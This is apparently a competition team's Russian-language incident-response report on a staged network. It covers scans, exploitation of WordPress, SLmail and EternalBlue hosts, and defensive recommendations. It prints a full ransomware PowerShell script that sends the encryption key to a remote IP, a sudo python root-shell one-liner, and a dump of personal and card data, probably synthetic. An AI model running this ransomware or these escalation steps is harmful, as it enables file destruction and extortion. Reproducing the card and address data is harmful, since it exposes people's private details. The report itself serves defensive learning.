<h1 align="center">nto-2022-finals</h1> 
<h1 align="center">Отчет команды DEFINE AIDAR ASADULLIN</h1>

## 1. Network Mapping

### 1.1. DMZ
```
Nmap scan report for 10.33.2.10
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    nginx 1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.2.11
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: CLEAN-DRUPAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.2.12
PORT     STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_8.6 (protocol 2.0)
25/tcp    open  smtp         SLmail smtpd 5.5.0.4433
79/tcp    open  finger       SLMail fingerd
106/tcp   open  pop3pw       SLMail pop3pw
110/tcp   open  pop3         BVRP Software SLMAIL pop3d
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: a33-slmail; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.2.53
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
53/tcp open  domain  ISC BIND
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### 1.2. SERVERS
```
Nmap scan report for 10.33.3.10
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 06:05:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: NS2; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.3.20
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          Microsoft Exchange smtpd
80/tcp   open  http          Microsoft IIS httpd 10.0
81/tc    open  http          Microsoft IIS httpd 10.0
110/tcp  open  pop3          Microsoft Exchange 2007-2010 pop3d
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          Microsoft Exchange 2007-2010 imapd
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
444/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
465/tcp  open  smtp          Microsoft Exchange smtpd
587/tcp  open  smtp          Microsoft Exchange smtpd
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
808/tcp  open  ccproxy-http?
993/tcp  open  ssl/imap      Microsoft Exchange 2007-2010 imapd
995/tcp  open  ssl/pop3      Microsoft Exchange 2007-2010 pop3d
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc
         open  msrpc         Microsoft Windows RPC
2525/tcp open  smtp          Microsoft Exchange smtpd
3389/tcp open  ms-wbt-server Microsoft Terminal Services
3800/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3801/tcp open  mc-nmf        .NET Message Framing
3828/tcp open  mc-nmf        .NET Message Framing
6001/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
6547/tcp open  msrpc         Microsoft Windows RPC
6565/tcp open  msrpc         Microsoft Windows RPC 
6566/tcp open  msrpc         Microsoft Windows RPC
7920/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mx1.company.local; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.3.50
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 06:05:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? 
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: NS1; OS: Windows; CPE: cpe:/o:microsoft:windows
```
### 1.3. OFFICE
```
Nmap scan report for 10.33.4.6
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.4.8
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: BUCHGARM; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.4.10
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.4.13
PORT     STATE SERVICE       VERSION 
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? 
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### 1.4. АСУ ТП
```
Nmap scan report for 10.33.239.5
PORT      STATE SERVICE        VERSION
22/tcp    open  ssh            OpenSSH for_Windows_8.6 (protocol 2.0)
80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
1433/tcp  open  ms-sql-s       Microsoft SQL Server 2012 11.00.7001
3389/tcp  open  ms-wbt-server?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: OIK-SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.239.6
PORT      STATE SERVICE        VERSION
22/tcp    open  ssh            OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
3389/tcp  open  ms-wbt-server?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49175/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: OIK-CLIENT; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.33.240.5
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.240.6
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.240.9
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.240.10
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.33.240.14
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: A33-ENTEK; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## 2. Сервисы

### 2.1. WordPress

Есть 3 порта: 80, 3306, 8080, доступен только порт 80

Найдена вкладка для отправки комментариев, были безуспешные попытки ввести инъекцию XSS.
Найдена страница входа в систему метрики http://10.33.2.10/wp-login.php, данные для входа `admin:admin`, электронная почта `cybermir@cybermir.ru`
При переходе на вкладку WP File Manager обнаружен файл `wp-config.php`, где находятся данные от базы mysql: 
```
define( 'DB_NAME', 'wpdb' );

define( 'DB_USER', 'wpuser' );

define( 'DB_PASSWORD', 'mypassword' );
```
Благодаря данным администратора с помощью arbitrary file upload (в Theme editor) мы пробросили reverse shell и получили remote code execution, 
с помощью нее найдена папка `cadm`, в которой находится веб-приложение на flask (`SolarApp_back`) с простой sql-инъекцией.
Скорее всего, именно ее использовал злоумышленник.

Используя Linux Smart Enumeration (https://github.com/diego-treitos/linux-smart-enumeration), было обнаружено, что python может быть запущен с помощью sudo без ввода пароля (вероятно, это было сделано для того, чтобы запускался ранее найденный flask-сервер). С помощью команды ниже мы получили root-доступ (убедились, введя команду id): 
```sudo python 2>&1 -c "from os import system; system('/bin/sh -i 2>&1')"```

Также мы скачали дамп базы mysql, который содержит личные данные посетителей сайта, включая их номера телефонов, адрес проживания и номера банковских карт.

```
+-------------------------------+
| Tables_in_counter_information |
+-------------------------------+
| counter_cost                  |
| counter_customer_information  |
| counter_staff_information     |
+-------------------------------+
3 rows in set (0.00 sec)

mysql> select * from counter_cost;
+------+-----------------------------------------------------+------------+---------------+
| id   | districtDescription                                 | districtID | counter_price |
+------+-----------------------------------------------------+------------+---------------+
|    1 | Северный район (РЭС Север)                          | DPS_north  |          1316 |
|    2 | Восточный район (РЭС Восток)                        | DPS_east   |          1222 |
|    3 | Южный район (РЭС Юг)                                | DPS_south  |          1500 |
|    4 | Западный район (РЭС Запад)                          | PDS_west   |          1100 |
+------+-----------------------------------------------------+------------+---------------+
4 rows in set (0.00 sec)

mysql> select * from counter_customer_information;
+------+----------------------+----------------------+-------------------------------------------------------------------------------------------+------------------------+--------------------+--------------------+------+----------------+
| id   | customerSurname      | customerName         | customerAddress                                                                           | customerContractNumber | customerPhone      | NumberOfCreditCard | CVC  | CreditCardDate |
+------+----------------------+----------------------+-------------------------------------------------------------------------------------------+------------------------+--------------------+--------------------+------+----------------+
|    1 | Скачков              | Лукьян               | 618254, ул. Паперника, дом 120, квартира 167                                              |                 182394 | +7 (948) 994-57-35 | 75647586978664537  |  345 | 09-12-2022     |
|    2 | Высоцкий             | Радован              | 140987, ул. Лучевой 3-й просек, дом 46, квартира 528                                      |                 758635 | +7 (912) 263-17-64 | 44354684657576898  |  746 | 19-10-2021     |
|    3 | Афанасьева           | Людмила              | 347090, ул. Волхонка, дом 142, квартира 943                                               |                  94675 | +7 (982) 890-20-21 | 5546738475036542   |  645 | 28-01-2028     |
|    4 | Высоцкий             | Ульян                | 665670, ул. Кирпичная Горка 2-я, дом 89, квартира 819                                     |                8475643 | +7 (906) 516-53-46 | 1875000964837653   |  657 | 19-02-2029     |
|    5 | Белозёров            | Евграф               | 624269, ул. Новочеремушкинская, дом 158, квартира 765                                     |                 987564 | +7 (986) 754-84-99 | 8745601923971845   |   98 | 11-07-2025     |
|    6 | Шарыпова             | Антонина             | 607954, ул. Черниговский пер, дом 171, квартира 44                                        |                1637452 | +7 (954) 288-51-30 | 9808565043629564   |  123 | 22-06-2022     |
|    7 | Демьянов             | Юрий                 | 687432, ул. Кьтуры пл, дом 185, квартира 26                                               |                 123459 | +7 (906) 155-13-11 | 8905647950000672   |  648 |
```

Проверив логи nginx, мы обнаружили, что потенциальный IP-адрес злоумышленника - 192.168.224. 

### 2.2. SLmail

С помощью Metasploit (https://www.rapid7.com/db/modules/exploit/windows/pop3/seattlelab_pass/) получен доступ к консоли Windows пользователя, там найдены папки SLmail, SLadmin (в папке Program File (x86)).
С помощью команды ```net user``` был обнаружен пользователь cadm. Изменив пароль у этого пользователя, мы смогли подключиться по RDP. Основные цели -  восстановить сервер Slmail и восстановить пароль на сервисе CyberPolygon. В админ панеле были обнаружены адреса пользователей.
При попытке починить выяснились проблемы с доменом a33-slmail

Порядок команд для изменения пароля:
```
chcp 65001

net user cadm pass
```
В последствии оказалось, что пользователь cadm имеет права Администратора.

### 2.3. SIED (10.33.240.5, .6, .9, .10) 

Это релейная защита на 10кв.

С помощью социальной инженерии удалось найти руководство по эксплуатации данной разработки (http://www.smarteps.ru/). 

Также удалось выяснить, что IP-адреса с 3-им октетом .240 соединены с 10.33.240.14, но некоторые из них не работают (об этом будет рассказано в пункте 2.4)

### 2.4. 10.33.240.14 (Eternal Blue)

Использовав эксплойт мы выяснили, что на данном сервисе есть уязвимость Eternal Blue. 
Сменив пароль пользовалеля cadm, как в случае с SLmail, мы подключились по rdp. На компьютере была обнаружена папка EnLogicTLC, в которой лежит приложение EnLogic. Цитируя руководство пользователя данной программы:
```
EnLogic – это технологическая платформа для программирования микропроцессорных
контроллеров с открытой архитектурой и реализации коммуникационных шлюзов и
конвертеров протоколов. 
```
В папке также лежали файлы EnLogicSvc.log, EnLogicSvc61850data.csv, enlogic.cfg. В файле enlogic.cfg найдены такие данные:
```
psw_psw1="8d777f385d3dfec8815d20f7496026dc"
psw_psw2="2245023265ae4cf87d02c8b6ba991139"
psw_psw3="21232f297a57a5a743894a0e4a801fc3"
```
По виду данных строк видно, что это md5-хэши, при расшифровке выяснилось, что 
```
psw_psw1="data"
psw_psw2="config"
psw_psw3="admin"
```
Видно что сайтов с электроникой должно было быть 8, а не 4.
При запуске приложения было обнаружено, что некоторые IP-адресы не соответствуют данным нам в самом начале, например 10.33.241.8 (в данном случае октет .241 не является верным), а также при просмотре логов обнаружена такая строка: 
```
|  Error bind() IEC 104 socket! (IecTaskCB.Port = 2404), retry in 30 seconds...
```
Это означает, что октеты IP-адресов были намеренно изменены. Для того, чтобы вернуть все на прежние места, мы обратились к руководству по эксплуатации:
```
При сохранении любой конфигурации, которая была сохранена ранее, старый файл
сохраняется в файле с тем же самым именем и расширением *.bak, поэтому если по
какой-то причине вам нужно восстановить версию до последней перезаписи
конфигурации - переименуйте bak-файл в enl-файл и откройте при помощи
инструментальной системы.
```
Так как в папке лежал такой файл, то мы проделали то же самое.

### 2.5. 10.33.239.5 OIK-SERVER (Eternal Blue)

На этом сервере стоит программа ОИК Диспетчер НТ для приема и обработки телеметрической информации, организация её хранения и доступ к результатам телеметрии и базам данных. Мы достали файл Database.db, но в нем таблицы оказались пустыми.
Как и в предыдущем случае, это сервис оказался уязвимым к атаке EternalBlue. Проделав все шаги по смене пароля и получению доступа по rdp, мы обнаружили приложение "Настройка серверов", запускаемое только от имени Администратора. При запуске мы попытались подключиться к IP-адресу 10.33.239.6, но неудачно. Скорее всего, проблема именно на этом компьютере, так как в "Устройствах" компьютера указано, что у OIK-SERVER есть неполадки. При попытке их устранения ничего не происходит.

### 2.6. 10.33.239.6 OIK-CLIENT (Eternal Blue)

Еще один уязвимый сервис. При подключении по rdp найдено приложение "Клиент ОИК диспетчер (pgsql)". Работа этого сервиса зависит от 10.33.239.6

В папке Share найдены файлы с расширением .cert. (Самый важный - FLAG.txt.cert)

Найден файл Ransom.ps1. Внутри оказался код шифрования AES (CBC). Внутри находится код шифрования файлов. key и iv отправляются на `http://$IP/key=$Key&iv=$IV&pc=$env:computername`.

```
set-strictMode -version 2.0
function Ransom
{

Param(
    [Parameter(Position = 0)]
    [String]
    $IP='127.0.0.1'
    )

    $aesManaged=new-object "System.Security.Cryptography.AesManaged";
    $aesManaged.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $aesManaged.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;
    $aesManaged.BlockSize=128;
    $aesManaged.KeySize=256;
    $aesManaged.GenerateKey();
    $IV =  [System.Convert]::ToBase64String($aesManaged.IV);
    $key = [System.Convert]::ToBase64String($aesManaged.Key);

    $URL="http://$IP/key=$Key&iv=$IV&pc=$env:computername";
    try { Invoke-WebRequest $URL } catch {
        $_.Exception.Response.StatusCode.Value__}

    $background = "http://$IP/wall.jpg"
    Invoke-WebRequest -Uri $background -OutFile "/users/$env:USERNAME/wall.jpg"
    Start-Sleep -s 2
    $wallpaper = "C:/users/$env:USERNAME/wall.jpg"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
    Start-Sleep -s 2
    rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False

    vssadmin delete shadows /all /quiet;
    spsv vss -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode) -ne "Disabled"){
    set-service vss -StartupType Disabled};

    bcdedit /set recoveryenabled No|Out-Null;
    bcdedit /set bootstatuspolicy ignoreallfailures|Out-Null;

    spsv Wscsvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wscsvc'").StartMode) -ne "Disabled"){
    set-service Wscsvc -StartupType Disabled};
    spsv WinDefend -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WinDefend'").StartMode) -ne "Disabled"){
    set-service WinDefend -StartupType Disabled};
    spsv Wuauserv -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wuauserv'").StartMode) -ne "Disabled"){
    set-service Wuauserv -StartupType Disabled};
    spsv BITS -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='BITS'").StartMode) -ne "Disabled"){
    set-service BITS -StartupType Disabled};
    spsv ERSvc -ErrorAction SilentlyContinue;
    spsv WerSvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WerSvc'").StartMode) -ne "Disabled"){
    set-service WerSvc -StartupType Disabled};

    Write-Output "Encryption phase" 

    $encryptor=$aesManaged.CreateEncryptor();
    $directory = "C:\Share"
    $files=gci $directory -Recurse -Include *.txt,*.pdf,*.docx,*.doc,*.jpg;
    foreach($file in $files) {
        $bytes=[System.IO.File]::ReadAllBytes($($file.FullName));
        $encryptedData=$encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData=$aesManaged.IV + $encryptedData;
        [System.IO.File]::WriteAllBytes($($file.FullName+".crpt"),$fullData);
        Remove-Item $file;
    }
}
```


В папке InterfaceSSH лежит папка с исходным кодом программы OIK-CLIENT. При запуске выдает ошибку. 

### 2.7. 10.33.4.8 (Eternal Blue)

Найден файл winlogon.txt (даты - 23-28 февраля, это точно злоумышленник)

Компьютеры в сети: BUCHGARM, CUSTARM, ENGGENERAL, SYSADMINARM, tsclient

### 2.8. CyberPolygon (10.33.2.11)

Сервер был обнаружен, были попытки побрутить пароли, зная логин `admin`, но безуспешные.
Также в source code было обнаружено, что в данной версии DRUPAL возможна инъекция XSS. 

Также был обнаружен smbclient на портах 139 и 445, но попытки подключиться не увенчались успехом.

Данная версия Samba достаточно уязвима для некоторых атак.

Скорее всего адресс лежит на почте slmail.

### 2.8. 10.33.2.53 (ISC BIND)

### 2.9. Все IP-адреса SERVERS

На 10.33.3.20 стоит Microsoft Exchange, были попытки подсоединиться с почтой из WordPress (cybermir@cybermir.ru)

На 10.33.3.10 и 10.33.3.50 стоит Active Directory LDAP, подключиться не получилось

### 2.9. OFFICE (кроме 10.33.4.8) - Microsoft Terminal Services

## 3. Возможные пути защиты

### 3.1. Word Press
- изменение пароля администратора на более сложный (например, хэш)
- изменение кода сервиса на порту 8080 (а именно в месте, где может быть произведена sql-инъекция)
- поменять дефолтный пароль в базе данных (а также название базы данных и имя пользователя, которые захардкожены)
- использовать docker-контейнер
- убрать запуск python с привилегиями у любого пользователя

### 3.2. Все серверы с Eternal Blue
- своевременно обновлять ОС
- установить firewall у порта 445
- обновить smb

### 3.3. SLmail
- заменить почтовый сервер

### 3.4. CyberPolygon
- обновить версию Samba  
- обновить версию DRUPAL
